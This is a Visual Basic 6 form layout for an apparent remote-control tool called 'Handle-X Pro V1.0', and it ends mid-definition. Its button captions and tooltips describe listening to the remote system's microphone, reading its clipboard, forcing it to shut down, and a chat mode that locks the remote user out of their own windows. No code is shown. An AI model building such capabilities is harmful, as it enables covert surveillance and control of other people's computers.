VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Begin VB.Form Frm_Main 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   0  'None
   Caption         =   "Handle-X Pro V1.0"
   ClientHeight    =   6510
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   10830
   ForeColor       =   &H00000000&
   Icon            =   "frm_main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MousePointer    =   99  'Custom
   ScaleHeight     =   6510
   ScaleWidth      =   10830
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   1
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   12
      Top             =   1560
      Visible         =   0   'False
      Width           =   375
      Begin VB.Frame ChatRoom 
         Appearance      =   0  'Flat
         BackColor       =   &H00885517&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   4440
         Index           =   4
         Left            =   0
         TabIndex        =   207
         Top             =   480
         Width           =   8655
         Begin VB.PictureBox MSscreen 
            Appearance      =   0  'Flat
            AutoRedraw      =   -1  'True
            BackColor       =   &H00FFFFFF&
            DrawWidth       =   2
            Enabled         =   0   'False
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   177
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   3015
            Left            =   1560
            ScaleHeight     =   2985
            ScaleWidth      =   5490
            TabIndex        =   211
            Top             =   480
            Width           =   5520
         End
         Begin VB.Label bar 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Number of rest mines is [45] mines"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000FFFF&
            Height          =   220
            Index           =   9
            Left            =   1560
            TabIndex        =   220
            Top             =   3480
            Width           =   5520
         End
         Begin VB.Label Score 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "0"
            BeginProperty Font 
               Name            =   "Times New Roman"
               Size            =   39.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000FFFF&
            Height          =   1035
            Index           =   1
            Left            =   7440
            TabIndex        =   219
            Top             =   1320
            Width           =   975
         End
         Begin VB.Label Score 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "0"
            BeginProperty Font 
               Name            =   "Times New Roman"
               Size            =   39.75
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000FFFF&
            Height          =   1035
            Index           =   0
            Left            =   240
            TabIndex        =   218
            Top             =   1320
            Width           =   975
         End
         Begin VB.Shape Shape1 
            BackColor       =   &H00FFFFFF&
            BorderWidth     =   2
            Height          =   1815
            Index           =   1
            Left            =   7320
            Top             =   840
            Width           =   1215
         End
         Begin VB.Label bar 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "His Score"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Index           =   8
            Left            =   7320
            TabIndex        =   217
            Top             =   840
            Width           =   1215
         End
         Begin VB.Shape Shape1 
            BackColor       =   &H00FFFFFF&
            BorderColor     =   &H00000000&
            BorderWidth     =   2
            Height          =   1815
            Index           =   0
            Left            =   120
            Top             =   840
            Width           =   1215
         End
         Begin VB.Label bar 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Your Score"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Index           =   7
            Left            =   120
            TabIndex        =   216
            Top             =   840
            Width           =   1215
         End
         Begin VB.Line Line2 
            BorderColor     =   &H00000000&
            BorderWidth     =   2
            Index           =   75
            X1              =   1420
            X2              =   1840
            Y1              =   240
            Y2              =   240
         End
         Begin VB.Label bar 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Mine Sweeper V1.0"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Index           =   6
            Left            =   1830
            TabIndex        =   210
            Top             =   120
            Width           =   4980
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log out from Mine Sweeper"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   17
            Left            =   5040
            MouseIcon       =   "frm_main.frx":74F2
            MousePointer    =   99  'Custom
            TabIndex        =   209
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   4020
            Width           =   3045
         End
         Begin VB.Line Line2 
            BorderColor     =   &H00000000&
            BorderWidth     =   2
            Index           =   82
            X1              =   7200
            X2              =   7200
            Y1              =   3840
            Y2              =   240
         End
         Begin VB.Line Line2 
            BorderColor     =   &H00000000&
            BorderWidth     =   2
            Index           =   81
            X1              =   1440
            X2              =   1440
            Y1              =   3840
            Y2              =   240
         End
         Begin VB.Line Line2 
            BorderColor     =   &H00000000&
            BorderWidth     =   2
            Index           =   80
            X1              =   6800
            X2              =   7200
            Y1              =   240
            Y2              =   240
         End
         Begin VB.Line Line2 
            BorderColor     =   &H00000000&
            BorderWidth     =   2
            Index           =   79
            X1              =   1020
            X2              =   7540
            Y1              =   3840
            Y2              =   3840
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log into Mine Sweeper"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   16
            Left            =   600
            MouseIcon       =   "frm_main.frx":77FC
            MousePointer    =   99  'Custom
            TabIndex        =   208
            ToolTipText     =   "Login"
            Top             =   4020
            Width           =   3045
         End
      End
      Begin VB.Frame ChatRoom 
         Appearance      =   0  'Flat
         BackColor       =   &H00885517&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   4440
         Index           =   2
         Left            =   0
         TabIndex        =   56
         Top             =   480
         Width           =   8655
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   74
            X1              =   1320
            X2              =   7080
            Y1              =   4200
            Y2              =   4200
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   73
            X1              =   840
            X2              =   7560
            Y1              =   2280
            Y2              =   2280
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   72
            X1              =   1320
            X2              =   1320
            Y1              =   4200
            Y2              =   2280
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   71
            X1              =   7080
            X2              =   7080
            Y1              =   4200
            Y2              =   2280
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Stop Listening To Remoted System Mic Device"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   15
            Left            =   1800
            MouseIcon       =   "frm_main.frx":7B06
            MousePointer    =   99  'Custom
            TabIndex        =   179
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   3600
            Width           =   4815
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Start Listening To Remoted System Mic Device"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   14
            Left            =   1800
            MouseIcon       =   "frm_main.frx":7E10
            MousePointer    =   99  'Custom
            TabIndex        =   178
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   2760
            Width           =   4815
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   66
            X1              =   840
            X2              =   7560
            Y1              =   2160
            Y2              =   2160
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   65
            X1              =   1320
            X2              =   7080
            Y1              =   240
            Y2              =   240
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   64
            X1              =   1320
            X2              =   1320
            Y1              =   2160
            Y2              =   240
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   63
            X1              =   7080
            X2              =   7080
            Y1              =   2160
            Y2              =   240
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log In Sound Chat [One Way From You !]"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   12
            Left            =   1800
            MouseIcon       =   "frm_main.frx":811A
            MousePointer    =   99  'Custom
            TabIndex        =   173
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   720
            Width           =   4815
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log Out From The Voice Stream"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   13
            Left            =   1800
            MouseIcon       =   "frm_main.frx":8424
            MousePointer    =   99  'Custom
            TabIndex        =   172
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   1560
            Width           =   4815
         End
      End
      Begin VB.Frame ChatRoom 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   4440
         Index           =   1
         Left            =   0
         TabIndex        =   55
         Top             =   500
         Width           =   8655
         Begin VB.OptionButton ChatType 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFFFFF&
            Caption         =   "Matrix"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   1
            Left            =   5090
            TabIndex        =   222
            ToolTipText     =   "Matrix Type is Remoted user control-less window and Maximized Ontop Window!"
            Top             =   4100
            Width           =   850
         End
         Begin VB.OptionButton ChatType 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFFFFF&
            Caption         =   "Normal"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000008&
            Height          =   255
            Index           =   0
            Left            =   4140
            TabIndex        =   221
            ToolTipText     =   "Normal Chat Type is normal window enables remoted user to control other windows on his system."
            Top             =   4100
            Width           =   960
         End
         Begin VB.TextBox txt_msg 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Enabled         =   0   'False
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   315
            IMEMode         =   3  'DISABLE
            Index           =   3
            Left            =   0
            TabIndex        =   190
            Top             =   3700
            Width           =   8600
         End
         Begin VB.TextBox txt_msg 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00BA5925&
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            IMEMode         =   3  'DISABLE
            Index           =   2
            Left            =   7280
            TabIndex        =   100
            Text            =   "Server_ID"
            Top             =   4080
            Width           =   1275
         End
         Begin VB.TextBox txt_msg 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00BA5925&
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            IMEMode         =   3  'DISABLE
            Index           =   1
            Left            =   6000
            TabIndex        =   96
            Text            =   "Client_ID"
            Top             =   4080
            Width           =   1275
         End
         Begin VB.TextBox txt_msg 
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00404040&
            Height          =   3615
            Index           =   0
            Left            =   30
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            ScrollBars      =   2  'Vertical
            TabIndex        =   57
            Top             =   30
            Width           =   8565
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Copy To X-Editor"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   11
            Left            =   2355
            MouseIcon       =   "frm_main.frx":872E
            MousePointer    =   99  'Custom
            TabIndex        =   99
            ToolTipText     =   "Close Chat Interface At The Remoted System"
            Top             =   4080
            Width           =   1695
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log Out"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   10
            Left            =   1200
            MouseIcon       =   "frm_main.frx":8A38
            MousePointer    =   99  'Custom
            TabIndex        =   98
            ToolTipText     =   "Close Chat Interface At The Remoted System"
            Top             =   4080
            Width           =   1095
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log In"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   9
            Left            =   30
            MouseIcon       =   "frm_main.frx":8D42
            MousePointer    =   99  'Custom
            TabIndex        =   97
            ToolTipText     =   "Start Chat Interface At The Remoted System"
            Top             =   4080
            Width           =   1095
         End
      End
      Begin VB.Frame ChatRoom 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   4395
         Index           =   0
         Left            =   0
         TabIndex        =   54
         Top             =   500
         Width           =   8595
         Begin MSComctlLib.ImageList MsgBoxIcons 
            Left            =   7440
            Top             =   1800
            _ExtentX        =   1005
            _ExtentY        =   1005
            BackColor       =   -2147483643
            ImageWidth      =   48
            ImageHeight     =   48
            MaskColor       =   12632256
            _Version        =   393216
            BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
               NumListImages   =   5
               BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frm_main.frx":904C
                  Key             =   ""
               EndProperty
               BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frm_main.frx":90B8
                  Key             =   ""
               EndProperty
               BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frm_main.frx":9295
                  Key             =   ""
               EndProperty
               BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frm_main.frx":9430
                  Key             =   ""
               EndProperty
               BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frm_main.frx":95E2
                  Key             =   ""
               EndProperty
            EndProperty
         End
         Begin VB.TextBox WindowsControl 
            Appearance      =   0  'Flat
            BackColor       =   &H00BA5925&
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   240
            IMEMode         =   3  'DISABLE
            Index           =   4
            Left            =   1560
            TabIndex        =   87
            Text            =   "Message Title (Click To Edit)"
            Top             =   960
            Width           =   5175
         End
         Begin VB.TextBox WindowsControl 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFFFFF&
            BorderStyle     =   0  'None
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   1200
            IMEMode         =   3  'DISABLE
            Index           =   3
            Left            =   2980
            MultiLine       =   -1  'True
            TabIndex        =   84
            Text            =   "frm_main.frx":982B
            Top             =   1440
            Width           =   3975
         End
         Begin VB.Image MsgIcon 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   735
            Left            =   1920
            Stretch         =   -1  'True
            Top             =   1440
            Width           =   735
         End
         Begin VB.Line Line2 
            Index           =   48
            X1              =   6960
            X2              =   1560
            Y1              =   2640
            Y2              =   2640
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "<"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   7
            Left            =   1680
            MouseIcon       =   "frm_main.frx":984A
            MousePointer    =   99  'Custom
            TabIndex        =   95
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   1680
            Width           =   255
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   ">"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   8
            Left            =   2640
            MouseIcon       =   "frm_main.frx":9B54
            MousePointer    =   99  'Custom
            TabIndex        =   94
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   1680
            Width           =   255
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Send Message"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   1
            Left            =   4920
            MouseIcon       =   "frm_main.frx":9E5E
            MousePointer    =   99  'Custom
            TabIndex        =   93
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   3960
            Width           =   1815
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Test Message"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   0
            Left            =   1920
            MouseIcon       =   "frm_main.frx":A168
            MousePointer    =   99  'Custom
            TabIndex        =   92
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   3960
            Width           =   1815
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Ok"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   4
            Left            =   5280
            MouseIcon       =   "frm_main.frx":A472
            MousePointer    =   99  'Custom
            TabIndex        =   91
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   2760
            Visible         =   0   'False
            Width           =   1335
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Ok"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   2
            Left            =   1920
            MouseIcon       =   "frm_main.frx":A77C
            MousePointer    =   99  'Custom
            TabIndex        =   90
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   2760
            Visible         =   0   'False
            Width           =   1335
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "<"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   5
            Left            =   1320
            MouseIcon       =   "frm_main.frx":AA86
            MousePointer    =   99  'Custom
            TabIndex        =   89
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   2760
            Width           =   255
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   ">"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   6
            Left            =   6960
            MouseIcon       =   "frm_main.frx":AD90
            MousePointer    =   99  'Custom
            TabIndex        =   88
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   2760
            Width           =   255
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Ok"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   3
            Left            =   3600
            MouseIcon       =   "frm_main.frx":B09A
            MousePointer    =   99  'Custom
            TabIndex        =   86
            ToolTipText     =   "Get The Remoted System ClipBoard Text"
            Top             =   2760
            Width           =   1335
         End
         Begin VB.Line Line2 
            Index           =   47
            X1              =   1560
            X2              =   6960
            Y1              =   3120
            Y2              =   3120
         End
         Begin VB.Line Line2 
            Index           =   46
            X1              =   6960
            X2              =   6960
            Y1              =   1200
            Y2              =   3120
         End
         Begin VB.Line Line2 
            Index           =   45
            X1              =   1560
            X2              =   1560
            Y1              =   1200
            Y2              =   3120
         End
         Begin VB.Label Description 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00BA5925&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "X"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00C0C0C0&
            Height          =   240
            Index           =   9
            Left            =   6720
            TabIndex        =   85
            Top             =   960
            Width           =   255
         End
      End
      Begin VB.Frame ChatRoom 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   4440
         Index           =   3
         Left            =   0
         TabIndex        =   201
         Top             =   480
         Width           =   8655
         Begin VB.PictureBox WBScreen 
            Appearance      =   0  'Flat
            AutoRedraw      =   -1  'True
            BackColor       =   &H80000005&
            ForeColor       =   &H80000008&
            Height          =   3950
            Left            =   40
            MousePointer    =   99  'Custom
            ScaleHeight     =   3915
            ScaleWidth      =   8505
            TabIndex        =   203
            Top             =   40
            Width           =   8540
            Begin MSComctlLib.ImageList WhiteBoardImages 
               Left            =   3840
               Top             =   1680
               _ExtentX        =   1005
               _ExtentY        =   1005
               BackColor       =   -2147483643
               ImageWidth      =   12
               ImageHeight     =   12
               MaskColor       =   12632256
               _Version        =   393216
               BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
                  NumListImages   =   6
                  BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                     Picture         =   "frm_main.frx":B3A4
                     Key             =   ""
                  EndProperty
                  BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                     Picture         =   "frm_main.frx":B93E
                     Key             =   ""
                  EndProperty
                  BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                     Picture         =   "frm_main.frx":BA20
                     Key             =   ""
                  EndProperty
                  BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
